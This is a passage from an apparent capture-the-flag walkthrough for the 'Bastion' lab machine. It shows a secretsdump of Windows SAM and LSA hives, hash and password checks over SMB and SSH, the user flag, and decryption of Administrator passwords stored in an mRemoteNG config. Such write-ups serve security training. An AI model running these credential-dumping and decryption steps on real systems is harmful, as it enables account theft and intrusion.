+dpapi_machinekey:0x32764bdcb45f472159af59f1dc287fd1920016a6
+dpapi_userkey:0xd2e02883757da99914e3138496705b223e9d03dd
+[*] Cleaning up...</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/<span class="hljs-symbol">Desktop</span>/<span class="hljs-symbol">Labs</span>/<span class="hljs-symbol">Bastion</span>]
+&boxur;&boxh;$ sudo impacket-secretsdump -sam <span class="hljs-symbol">SAM</span> -security <span class="hljs-symbol">SECURITY</span> -system <span class="hljs-symbol">SYSTEM</span> local
+[sudo] password for kali: 
+<span class="hljs-symbol">Impacket</span> v0<span class="hljs-number">.14</span><span class="hljs-number">.0</span>.dev0 - <span class="hljs-symbol">Copyright</span> <span class="hljs-symbol">Fortra</span>, <span class="hljs-symbol">LLC</span> and its affiliated companies 
+
+[*] <span class="hljs-symbol">Target</span> system bootKey: <span class="hljs-number">0x8b56b2cb5033d8e2e289c26f8939a25f</span>
+[*] <span class="hljs-symbol">Dumping</span> local <span class="hljs-symbol">SAM</span> hashes (uid:rid:lmhash:nthash)
+<span class="hljs-symbol">Administrator</span>:<span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::
+<span class="hljs-symbol">Guest</span>:<span class="hljs-number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::
+<span class="hljs-symbol">L4mpje</span>:<span class="hljs-number">1000</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">26112010952</span>d963c8dc4217daec986d9:::
+[*] <span class="hljs-symbol">Dumping</span> cached domain logon information (domain/username:hash)
+[*] <span class="hljs-symbol">Dumping</span> <span class="hljs-symbol">LSA</span> <span class="hljs-symbol">Secrets</span>
+[*] <span class="hljs-symbol">DefaultPassword</span> 
+(<span class="hljs-symbol">Unknown</span> <span class="hljs-symbol">User</span>):bureaulampje
+[*] <span class="hljs-symbol">DPAPI_SYSTEM</span> 
+dpapi_machinekey:<span class="hljs-number">0x32764bdcb45f472159af59f1dc287fd1920016a6</span>
+dpapi_userkey:<span class="hljs-number">0xd2e02883757da99914e3138496705b223e9d03dd</span>
+[*] <span class="hljs-symbol">Cleaning</span> up...</code></pre></div>
+<p>For some reason, the credentials did not work. After resetting the box, I got a hit as the user <code class="inline-code">L4mpje</code> with the password <code class="inline-code">bureaulampje</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Bastion]
+&boxur;&boxh;$ nxc smb 10.129.11.95 -u &apos;L4mpje&apos; -H 26112010952d963c8dc4217daec986d9  
+SMB         10.129.11.95    445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)
+SMB         10.129.11.95    445    BASTION          [+] Bastion\L4mpje:26112010952d963c8dc4217daec986d9</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~<span class="hljs-regexp">/Desktop/</span>Labs/Bastion]
+&boxur;&boxh;$ nxc smb <span class="hljs-number">10.129</span><span class="hljs-number">.11</span><span class="hljs-number">.95</span> -u <span class="hljs-string">&apos;L4mpje&apos;</span> -H <span class="hljs-number">26112010952</span>d963c8dc4217daec986d9  
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.11</span><span class="hljs-number">.95</span>    <span class="hljs-number">445</span>    BASTION          [*] Windows Server <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span> x64 (name:BASTION) (<span class="hljs-built_in">domain</span>:Bastion) (signing:<span class="hljs-literal">False</span>) (SMBv1:<span class="hljs-literal">True</span>)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.11</span><span class="hljs-number">.95</span>    <span class="hljs-number">445</span>    BASTION          [+] Bastion\L4mpje:<span class="hljs-number">26112010952</span>d963c8dc4217daec986d9</code></pre></div>
+<p>Since SSH is open, the credentials work successfully:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Bastion]
+&boxur;&boxh;$ nxc ssh 10.129.11.95 -u &apos;L4mpje&apos; -p bureaulampje                     
+SSH         10.129.11.95    22     10.129.11.95     [*] SSH-2.0-OpenSSH_for_Windows_7.9
+SSH         10.129.11.95    22     10.129.11.95     [+] L4mpje:bureaulampje  Windows - Shell access!</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Bastion]
+&boxur;&boxh;$ nxc ssh <span class="hljs-number">10.129.11.95</span> -u &apos;L4mpje&apos; -p bureaulampje                     
+SSH         <span class="hljs-number">10.129.11.95</span>    <span class="hljs-number">22</span>     <span class="hljs-number">10.129.11.95</span>     [*] SSH-<span class="hljs-number">2</span>.<span class="hljs-number">0</span>-OpenSSH_for_Windows_7.<span class="hljs-number">9</span>
+SSH         <span class="hljs-number">10.129.11.95</span>    <span class="hljs-number">22</span>     <span class="hljs-number">10.129.11.95</span>     [+] L4mpje:bureaulampje  Windows - Shell access!</code></pre></div>
+<p>Use SSH to gain a shell on the machine:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">Microsoft Windows [Version 10.0.14393]                                                                                          
+(c) 2016 Microsoft Corporation. All rights reserved.                                                                            
+
+l4mpje@BASTION C:\Users\L4mpje&gt;whoami                                                                                           
+bastion\l4mpje                                                                                                                  
+
+l4mpje@BASTION C:\Users\L4mpje&gt;whoami /priv                                                                                     
+
+PRIVILEGES INFORMATION                                                                                                          
+----------------------                                                                                                          
+
+Privilege Name                Description                    State                                                              
+============================= ============================== =======                                                            
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                            
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled                                                            
+
+l4mpje@BASTION C:\Users\L4mpje&gt; </pre><pre class="hljs"><code>Microsoft Windows [Version 10.0.14393]                                                                                          
+(c) 2016 Microsoft Corporation. All rights reserved.                                                                            
+
+l4mpje@BASTION C:\Users\L4mpje&gt;whoami                                                                                           
+bastion\l4mpje                                                                                                                  
+
+l4mpje@BASTION C:\Users\L4mpje&gt;whoami /priv                                                                                     
+
+PRIVILEGES INFORMATION                                                                                                          
+----------------------                                                                                                          
+
+Privilege Name                Description                    State                                                              
+============================= ============================== =======                                                            
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                            
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled                                                            
+
+l4mpje@BASTION C:\Users\L4mpje&gt; </code></pre></div>
+<p>The <code class="inline-code">user.txt</code> flag:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">l4mpje@BASTION C:\Users\L4mpje&gt;cd Desktop                                                                                       
+
+l4mpje@BASTION C:\Users\L4mpje\Desktop&gt;dir                                                                                      
+ Volume in drive C has no label.                                                                                                
+ Volume Serial Number is 1B7D-E692                                                                                              
+
+ Directory of C:\Users\L4mpje\Desktop                                                                                           
+
+22-02-2019  15:27    &lt;DIR&gt;          .                                                                                           
+22-02-2019  15:27    &lt;DIR&gt;          ..                                                                                          
+27-02-2026  22:24                34 user.txt                                                                                    
+               1 File(s)             34 bytes                                                                                   
+               2 Dir(s)   4.828.553.216 bytes free                                                                              
+
+l4mpje@BASTION C:\Users\L4mpje\Desktop&gt;more user.txt                                                                            
+fca0ed5430dd01aaa141d402e8efa80d                                                                                                
+
+l4mpje@BASTION C:\Users\L4mpje\Desktop&gt;</pre><pre class="hljs"><code>l4mpje@BASTION C:\Users\L4mpje&gt;cd Desktop                                                                                       
+
+l4mpje@BASTION C:\Users\L4mpje\Desktop&gt;dir                                                                                      
+ Volume in drive C has no label.                                                                                                
+ Volume Serial Number is 1B7D-E692                                                                                              
+
+ Directory of C:\Users\L4mpje\Desktop                                                                                           
+
+22-02-2019  15:27    &lt;DIR&gt;          .                                                                                           
+22-02-2019  15:27    &lt;DIR&gt;          ..                                                                                          
+27-02-2026  22:24                34 user.txt                                                                                    
+               1 File(s)             34 bytes                                                                                   
+               2 Dir(s)   4.828.553.216 bytes free                                                                              
+
+l4mpje@BASTION C:\Users\L4mpje\Desktop&gt;more user.txt                                                                            
+fca0ed5430dd01aaa141d402e8efa80d                                                                                                
+
+l4mpje@BASTION C:\Users\L4mpje\Desktop&gt;</code></pre></div>
+<p>There is <code class="inline-code">mRemoteNG</code> installed on the machine. Browse over to the <code class="inline-code">AppData</code> directory of user <code class="inline-code">L4mpje</code> and copy the <code class="inline-code">confCons.xml</code> file:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;mrng:Connections xmlns:mrng=&quot;http://mremoteng.org&quot; Name=&quot;Connections&quot; Export=&quot;false&quot; EncryptionEngine=&quot;AES&quot; BlockCipherMode=&quot;GCM&quot; KdfIterations=&quot;1000&quot; FullFileEncryption=&quot;false&quot; Protected=&quot;ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0oop8R8ddXKAx4KK7sAk6AA&quot; ConfVersion=&quot;2.6&quot;&gt;
+    &lt;Node Name=&quot;DC&quot; Type=&quot;Connection&quot; Descr=&quot;&quot; Icon=&quot;mRemoteNG&quot; Panel=&quot;General&quot; Id=&quot;500e7d58-662a-44d4-aff0-3a4f547a3fee&quot; Username=&quot;Administrator&quot; Domain=&quot;&quot; Password=&quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot; Hostname=&quot;127.0.0.1&quot; Protocol=&quot;RDP&quot; PuttySession=&quot;Default Settings&quot; Port=&quot;3389&quot; ConnectToConsole=&quot;false&quot; UseCredSsp=&quot;true&quot; RenderingEngine=&quot;IE&quot; ICAEncryptionStrength=&quot;EncrBasic&quot; RDPAuthenticationLevel=&quot;NoAuth&quot; RDPMinutesToIdleTimeout=&quot;0&quot; RDPAlertIdleTimeout=&quot;false&quot; LoadBalanceInfo=&quot;&quot; Colors=&quot;Colors16Bit&quot; Resolution=&quot;FitToWindow&quot; AutomaticResize=&quot;true&quot; DisplayWallpaper=&quot;false&quot; DisplayThemes=&quot;false&quot; EnableFontSmoothing=&quot;false&quot; EnableDesktopComposition=&quot;false&quot; CacheBitmaps=&quot;false&quot; RedirectDiskDrives=&quot;false&quot; RedirectPorts=&quot;false&quot; RedirectPrinters=&quot;false&quot; RedirectSmartCards=&quot;false&quot; RedirectSound=&quot;DoNotPlay&quot; SoundQuality=&quot;Dynamic&quot; RedirectKeys=&quot;false&quot; Connected=&quot;false&quot; PreExtApp=&quot;&quot; PostExtApp=&quot;&quot; MacAddress=&quot;&quot; UserField=&quot;&quot; ExtApp=&quot;&quot; VNCCompression=&quot;CompNone&quot; VNCEncoding=&quot;EncHextile&quot; VNCAuthMode=&quot;AuthVNC&quot; VNCProxyType=&quot;ProxyNone&quot; VNCProxyIP=&quot;&quot; VNCProxyPort=&quot;0&quot; VNCProxyUsername=&quot;&quot; VNCProxyPassword=&quot;&quot; VNCColors=&quot;ColNormal&quot; VNCSmartSizeMode=&quot;SmartSAspect&quot; VNCViewOnly=&quot;false&quot; RDGatewayUsageMethod=&quot;Never&quot; RDGatewayHostname=&quot;&quot; RDGatewayUseConnectionCredentials=&quot;Yes&quot; RDGatewayUsername=&quot;&quot; RDGatewayPassword=&quot;&quot; RDGatewayDomain=&quot;&quot; InheritCacheBitmaps=&quot;false&quot; InheritColors=&quot;false&quot; InheritDescription=&quot;false&quot; InheritDisplayThemes=&quot;false&quot; InheritDisplayWallpaper=&quot;false&quot; InheritEnableFontSmoothing=&quot;false&quot; InheritEnableDesktopComposition=&quot;false&quot; InheritDomain=&quot;false&quot; InheritIcon=&quot;false&quot; InheritPanel=&quot;false&quot; InheritPassword=&quot;false&quot; InheritPort=&quot;false&quot; InheritProtocol=&quot;false&quot; InheritPuttySession=&quot;false&quot; InheritRedirectDiskDrives=&quot;false&quot; InheritRedirectKeys=&quot;false&quot; InheritRedirectPorts=&quot;false&quot; InheritRedirectPrinters=&quot;false&quot; InheritRedirectSmartCards=&quot;false&quot; InheritRedirectSound=&quot;false&quot; InheritSoundQuality=&quot;false&quot; InheritResolution=&quot;false&quot; InheritAutomaticResize=&quot;false&quot; InheritUseConsoleSession=&quot;false&quot; InheritUseCredSsp=&quot;false&quot; InheritRenderingEngine=&quot;false&quot; InheritUsername=&quot;false&quot; InheritICAEncryptionStrength=&quot;false&quot; InheritRDPAuthenticationLevel=&quot;false&quot; InheritRDPMinutesToIdleTimeout=&quot;false&quot; InheritRDPAlertIdleTimeout=&quot;false&quot; InheritLoadBalanceInfo=&quot;false&quot; InheritPreExtApp=&quot;false&quot; InheritPostExtApp=&quot;false&quot; InheritMacAddress=&quot;false&quot; InheritUserField=&quot;false&quot; InheritExtApp=&quot;false&quot; InheritVNCCompression=&quot;false&quot; InheritVNCEncoding=&quot;false&quot; InheritVNCAuthMode=&quot;false&quot; InheritVNCProxyType=&quot;false&quot; InheritVNCProxyIP=&quot;false&quot; InheritVNCProxyPort=&quot;false&quot; InheritVNCProxyUsername=&quot;false&quot; InheritVNCProxyPassword=&quot;false&quot; InheritVNCColors=&quot;false&quot; InheritVNCSmartSizeMode=&quot;false&quot; InheritVNCViewOnly=&quot;false&quot; InheritRDGatewayUsageMethod=&quot;false&quot; InheritRDGatewayHostname=&quot;false&quot; InheritRDGatewayUseConnectionCredentials=&quot;false&quot; InheritRDGatewayUsername=&quot;false&quot; InheritRDGatewayPassword=&quot;false&quot; InheritRDGatewayDomain=&quot;false&quot; /&gt;
+    &lt;Node Name=&quot;L4mpje-PC&quot; Type=&quot;Connection&quot; Descr=&quot;&quot; Icon=&quot;mRemoteNG&quot; Panel=&quot;General&quot; Id=&quot;8d3579b2-e68e-48c1-8f0f-9ee1347c9128&quot; Username=&quot;L4mpje&quot; Domain=&quot;&quot; Password=&quot;yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB&quot; Hostname=&quot;192.168.1.75&quot; Protocol=&quot;RDP&quot; PuttySession=&quot;Default Settings&quot; Port=&quot;3389&quot; ConnectToConsole=&quot;false&quot; UseCredSsp=&quot;true&quot; RenderingEngine=&quot;IE&quot; ICAEncryptionStrength=&quot;EncrBasic&quot; RDPAuthenticationLevel=&quot;NoAuth&quot; RDPMinutesToIdleTimeout=&quot;0&quot; RDPAlertIdleTimeout=&quot;false&quot; LoadBalanceInfo=&quot;&quot; Colors=&quot;Colors16Bit&quot; Resolution=&quot;FitToWindow&quot; AutomaticResize=&quot;true&quot; DisplayWallpaper=&quot;false&quot; DisplayThemes=&quot;false&quot; EnableFontSmoothing=&quot;false&quot; EnableDesktopComposition=&quot;false&quot; CacheBitmaps=&quot;false&quot; RedirectDiskDrives=&quot;false&quot; RedirectPorts=&quot;false&quot; RedirectPrinters=&quot;false&quot; RedirectSmartCards=&quot;false&quot; RedirectSound=&quot;DoNotPlay&quot; SoundQuality=&quot;Dynamic&quot; RedirectKeys=&quot;false&quot; Connected=&quot;false&quot; PreExtApp=&quot;&quot; PostExtApp=&quot;&quot; MacAddress=&quot;&quot; UserField=&quot;&quot; ExtApp=&quot;&quot; VNCCompression=&quot;CompNone&quot; VNCEncoding=&quot;EncHextile&quot; VNCAuthMode=&quot;AuthVNC&quot; VNCProxyType=&quot;ProxyNone&quot; VNCProxyIP=&quot;&quot; VNCProxyPort=&quot;0&quot; VNCProxyUsername=&quot;&quot; VNCProxyPassword=&quot;&quot; VNCColors=&quot;ColNormal&quot; VNCSmartSizeMode=&quot;SmartSAspect&quot; VNCViewOnly=&quot;false&quot; RDGatewayUsageMethod=&quot;Never&quot; RDGatewayHostname=&quot;&quot; RDGatewayUseConnectionCredentials=&quot;Yes&quot; RDGatewayUsername=&quot;&quot; RDGatewayPassword=&quot;&quot; RDGatewayDomain=&quot;&quot; InheritCacheBitmaps=&quot;false&quot; InheritColors=&quot;false&quot; InheritDescription=&quot;false&quot; InheritDisplayThemes=&quot;false&quot; InheritDisplayWallpaper=&quot;false&quot; InheritEnableFontSmoothing=&quot;false&quot; InheritEnableDesktopComposition=&quot;false&quot; InheritDomain=&quot;false&quot; InheritIcon=&quot;false&quot; InheritPanel=&quot;false&quot; InheritPassword=&quot;false&quot; InheritPort=&quot;false&quot; InheritProtocol=&quot;false&quot; InheritPuttySession=&quot;false&quot; InheritRedirectDiskDrives=&quot;false&quot; InheritRedirectKeys=&quot;false&quot; InheritRedirectPorts=&quot;false&quot; InheritRedirectPrinters=&quot;false&quot; InheritRedirectSmartCards=&quot;false&quot; InheritRedirectSound=&quot;false&quot; InheritSoundQuality=&quot;false&quot; InheritResolution=&quot;false&quot; InheritAutomaticResize=&quot;false&quot; InheritUseConsoleSession=&quot;false&quot; InheritUseCredSsp=&quot;false&quot; InheritRenderingEngine=&quot;false&quot; InheritUsername=&quot;false&quot; InheritICAEncryptionStrength=&quot;false&quot; InheritRDPAuthenticationLevel=&quot;false&quot; InheritRDPMinutesToIdleTimeout=&quot;false&quot; InheritRDPAlertIdleTimeout=&quot;false&quot; InheritLoadBalanceInfo=&quot;false&quot; InheritPreExtApp=&quot;false&quot; InheritPostExtApp=&quot;false&quot; InheritMacAddress=&quot;false&quot; InheritUserField=&quot;false&quot; InheritExtApp=&quot;false&quot; InheritVNCCompression=&quot;false&quot; InheritVNCEncoding=&quot;false&quot; InheritVNCAuthMode=&quot;false&quot; InheritVNCProxyType=&quot;false&quot; InheritVNCProxyIP=&quot;false&quot; InheritVNCProxyPort=&quot;false&quot; InheritVNCProxyUsername=&quot;false&quot; InheritVNCProxyPassword=&quot;false&quot; InheritVNCColors=&quot;false&quot; InheritVNCSmartSizeMode=&quot;false&quot; InheritVNCViewOnly=&quot;false&quot; InheritRDGatewayUsageMethod=&quot;false&quot; InheritRDGatewayHostname=&quot;false&quot; InheritRDGatewayUseConnectionCredentials=&quot;false&quot; InheritRDGatewayUsername=&quot;false&quot; InheritRDGatewayPassword=&quot;false&quot; InheritRDGatewayDomain=&quot;false&quot; /&gt;
+&lt;/mrng:Connections&gt;</pre><pre class="hljs"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;mrng:Connections xmlns:mrng=&quot;http://mremoteng.org&quot; Name=&quot;Connections&quot; Export=&quot;false&quot; EncryptionEngine=&quot;AES&quot; BlockCipherMode=&quot;GCM&quot; KdfIterations=&quot;1000&quot; FullFileEncryption=&quot;false&quot; Protected=&quot;ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0oop8R8ddXKAx4KK7sAk6AA&quot; ConfVersion=&quot;2.6&quot;&gt;
+    &lt;Node Name=&quot;DC&quot; Type=&quot;Connection&quot; Descr=&quot;&quot; Icon=&quot;mRemoteNG&quot; Panel=&quot;General&quot; Id=&quot;500e7d58-662a-44d4-aff0-3a4f547a3fee&quot; Username=&quot;Administrator&quot; Domain=&quot;&quot; Password=&quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot; Hostname=&quot;127.0.0.1&quot; Protocol=&quot;RDP&quot; PuttySession=&quot;Default Settings&quot; Port=&quot;3389&quot; ConnectToConsole=&quot;false&quot; UseCredSsp=&quot;true&quot; RenderingEngine=&quot;IE&quot; ICAEncryptionStrength=&quot;EncrBasic&quot; RDPAuthenticationLevel=&quot;NoAuth&quot; RDPMinutesToIdleTimeout=&quot;0&quot; RDPAlertIdleTimeout=&quot;false&quot; LoadBalanceInfo=&quot;&quot; Colors=&quot;Colors16Bit&quot; Resolution=&quot;FitToWindow&quot; AutomaticResize=&quot;true&quot; DisplayWallpaper=&quot;false&quot; DisplayThemes=&quot;false&quot; EnableFontSmoothing=&quot;false&quot; EnableDesktopComposition=&quot;false&quot; CacheBitmaps=&quot;false&quot; RedirectDiskDrives=&quot;false&quot; RedirectPorts=&quot;false&quot; RedirectPrinters=&quot;false&quot; RedirectSmartCards=&quot;false&quot; RedirectSound=&quot;DoNotPlay&quot; SoundQuality=&quot;Dynamic&quot; RedirectKeys=&quot;false&quot; Connected=&quot;false&quot; PreExtApp=&quot;&quot; PostExtApp=&quot;&quot; MacAddress=&quot;&quot; UserField=&quot;&quot; ExtApp=&quot;&quot; VNCCompression=&quot;CompNone&quot; VNCEncoding=&quot;EncHextile&quot; VNCAuthMode=&quot;AuthVNC&quot; VNCProxyType=&quot;ProxyNone&quot; VNCProxyIP=&quot;&quot; VNCProxyPort=&quot;0&quot; VNCProxyUsername=&quot;&quot; VNCProxyPassword=&quot;&quot; VNCColors=&quot;ColNormal&quot; VNCSmartSizeMode=&quot;SmartSAspect&quot; VNCViewOnly=&quot;false&quot; RDGatewayUsageMethod=&quot;Never&quot; RDGatewayHostname=&quot;&quot; RDGatewayUseConnectionCredentials=&quot;Yes&quot; RDGatewayUsername=&quot;&quot; RDGatewayPassword=&quot;&quot; RDGatewayDomain=&quot;&quot; InheritCacheBitmaps=&quot;false&quot; InheritColors=&quot;false&quot; InheritDescription=&quot;false&quot; InheritDisplayThemes=&quot;false&quot; InheritDisplayWallpaper=&quot;false&quot; InheritEnableFontSmoothing=&quot;false&quot; InheritEnableDesktopComposition=&quot;false&quot; InheritDomain=&quot;false&quot; InheritIcon=&quot;false&quot; InheritPanel=&quot;false&quot; InheritPassword=&quot;false&quot; InheritPort=&quot;false&quot; InheritProtocol=&quot;false&quot; InheritPuttySession=&quot;false&quot; InheritRedirectDiskDrives=&quot;false&quot; InheritRedirectKeys=&quot;false&quot; InheritRedirectPorts=&quot;false&quot; InheritRedirectPrinters=&quot;false&quot; InheritRedirectSmartCards=&quot;false&quot; InheritRedirectSound=&quot;false&quot; InheritSoundQuality=&quot;false&quot; InheritResolution=&quot;false&quot; InheritAutomaticResize=&quot;false&quot; InheritUseConsoleSession=&quot;false&quot; InheritUseCredSsp=&quot;false&quot; InheritRenderingEngine=&quot;false&quot; InheritUsername=&quot;false&quot; InheritICAEncryptionStrength=&quot;false&quot; InheritRDPAuthenticationLevel=&quot;false&quot; InheritRDPMinutesToIdleTimeout=&quot;false&quot; InheritRDPAlertIdleTimeout=&quot;false&quot; InheritLoadBalanceInfo=&quot;false&quot; InheritPreExtApp=&quot;false&quot; InheritPostExtApp=&quot;false&quot; InheritMacAddress=&quot;false&quot; InheritUserField=&quot;false&quot; InheritExtApp=&quot;false&quot; InheritVNCCompression=&quot;false&quot; InheritVNCEncoding=&quot;false&quot; InheritVNCAuthMode=&quot;false&quot; InheritVNCProxyType=&quot;false&quot; InheritVNCProxyIP=&quot;false&quot; InheritVNCProxyPort=&quot;false&quot; InheritVNCProxyUsername=&quot;false&quot; InheritVNCProxyPassword=&quot;false&quot; InheritVNCColors=&quot;false&quot; InheritVNCSmartSizeMode=&quot;false&quot; InheritVNCViewOnly=&quot;false&quot; InheritRDGatewayUsageMethod=&quot;false&quot; InheritRDGatewayHostname=&quot;false&quot; InheritRDGatewayUseConnectionCredentials=&quot;false&quot; InheritRDGatewayUsername=&quot;false&quot; InheritRDGatewayPassword=&quot;false&quot; InheritRDGatewayDomain=&quot;false&quot; /&gt;
+    &lt;Node Name=&quot;L4mpje-PC&quot; Type=&quot;Connection&quot; Descr=&quot;&quot; Icon=&quot;mRemoteNG&quot; Panel=&quot;General&quot; Id=&quot;8d3579b2-e68e-48c1-8f0f-9ee1347c9128&quot; Username=&quot;L4mpje&quot; Domain=&quot;&quot; Password=&quot;yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB&quot; Hostname=&quot;192.168.1.75&quot; Protocol=&quot;RDP&quot; PuttySession=&quot;Default Settings&quot; Port=&quot;3389&quot; ConnectToConsole=&quot;false&quot; UseCredSsp=&quot;true&quot; RenderingEngine=&quot;IE&quot; ICAEncryptionStrength=&quot;EncrBasic&quot; RDPAuthenticationLevel=&quot;NoAuth&quot; RDPMinutesToIdleTimeout=&quot;0&quot; RDPAlertIdleTimeout=&quot;false&quot; LoadBalanceInfo=&quot;&quot; Colors=&quot;Colors16Bit&quot; Resolution=&quot;FitToWindow&quot; AutomaticResize=&quot;true&quot; DisplayWallpaper=&quot;false&quot; DisplayThemes=&quot;false&quot; EnableFontSmoothing=&quot;false&quot; EnableDesktopComposition=&quot;false&quot; CacheBitmaps=&quot;false&quot; RedirectDiskDrives=&quot;false&quot; RedirectPorts=&quot;false&quot; RedirectPrinters=&quot;false&quot; RedirectSmartCards=&quot;false&quot; RedirectSound=&quot;DoNotPlay&quot; SoundQuality=&quot;Dynamic&quot; RedirectKeys=&quot;false&quot; Connected=&quot;false&quot; PreExtApp=&quot;&quot; PostExtApp=&quot;&quot; MacAddress=&quot;&quot; UserField=&quot;&quot; ExtApp=&quot;&quot; VNCCompression=&quot;CompNone&quot; VNCEncoding=&quot;EncHextile&quot; VNCAuthMode=&quot;AuthVNC&quot; VNCProxyType=&quot;ProxyNone&quot; VNCProxyIP=&quot;&quot; VNCProxyPort=&quot;0&quot; VNCProxyUsername=&quot;&quot; VNCProxyPassword=&quot;&quot; VNCColors=&quot;ColNormal&quot; VNCSmartSizeMode=&quot;SmartSAspect&quot; VNCViewOnly=&quot;false&quot; RDGatewayUsageMethod=&quot;Never&quot; RDGatewayHostname=&quot;&quot; RDGatewayUseConnectionCredentials=&quot;Yes&quot; RDGatewayUsername=&quot;&quot; RDGatewayPassword=&quot;&quot; RDGatewayDomain=&quot;&quot; InheritCacheBitmaps=&quot;false&quot; InheritColors=&quot;false&quot; InheritDescription=&quot;false&quot; InheritDisplayThemes=&quot;false&quot; InheritDisplayWallpaper=&quot;false&quot; InheritEnableFontSmoothing=&quot;false&quot; InheritEnableDesktopComposition=&quot;false&quot; InheritDomain=&quot;false&quot; InheritIcon=&quot;false&quot; InheritPanel=&quot;false&quot; InheritPassword=&quot;false&quot; InheritPort=&quot;false&quot; InheritProtocol=&quot;false&quot; InheritPuttySession=&quot;false&quot; InheritRedirectDiskDrives=&quot;false&quot; InheritRedirectKeys=&quot;false&quot; InheritRedirectPorts=&quot;false&quot; InheritRedirectPrinters=&quot;false&quot; InheritRedirectSmartCards=&quot;false&quot; InheritRedirectSound=&quot;false&quot; InheritSoundQuality=&quot;false&quot; InheritResolution=&quot;false&quot; InheritAutomaticResize=&quot;false&quot; InheritUseConsoleSession=&quot;false&quot; InheritUseCredSsp=&quot;false&quot; InheritRenderingEngine=&quot;false&quot; InheritUsername=&quot;false&quot; InheritICAEncryptionStrength=&quot;false&quot; InheritRDPAuthenticationLevel=&quot;false&quot; InheritRDPMinutesToIdleTimeout=&quot;false&quot; InheritRDPAlertIdleTimeout=&quot;false&quot; InheritLoadBalanceInfo=&quot;false&quot; InheritPreExtApp=&quot;false&quot; InheritPostExtApp=&quot;false&quot; InheritMacAddress=&quot;false&quot; InheritUserField=&quot;false&quot; InheritExtApp=&quot;false&quot; InheritVNCCompression=&quot;false&quot; InheritVNCEncoding=&quot;false&quot; InheritVNCAuthMode=&quot;false&quot; InheritVNCProxyType=&quot;false&quot; InheritVNCProxyIP=&quot;false&quot; InheritVNCProxyPort=&quot;false&quot; InheritVNCProxyUsername=&quot;false&quot; InheritVNCProxyPassword=&quot;false&quot; InheritVNCColors=&quot;false&quot; InheritVNCSmartSizeMode=&quot;false&quot; InheritVNCViewOnly=&quot;false&quot; InheritRDGatewayUsageMethod=&quot;false&quot; InheritRDGatewayHostname=&quot;false&quot; InheritRDGatewayUseConnectionCredentials=&quot;false&quot; InheritRDGatewayUsername=&quot;false&quot; InheritRDGatewayPassword=&quot;false&quot; InheritRDGatewayDomain=&quot;false&quot; /&gt;
+&lt;/mrng:Connections&gt;</code></pre></div>
+<p>Use <a data-from-md="" href="">mRemoteNG_Decrypt</a> tool to decrypt the password hashes:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Bastion/mRemoteNG-Decrypt]
+&boxur;&boxh;$ python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
+Password: thXLHM96BeKL0ER2
+                                                                                                                                                                         
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Bastion/mRemoteNG-Decrypt]
+&boxur;&boxh;$ python3 mremoteng_decrypt.py -s yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB        
+Password: bureaulampje</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~<span class="hljs-regexp">/Desktop/</span>Labs<span class="hljs-regexp">/Bastion/m</span>RemoteNG-Decrypt]
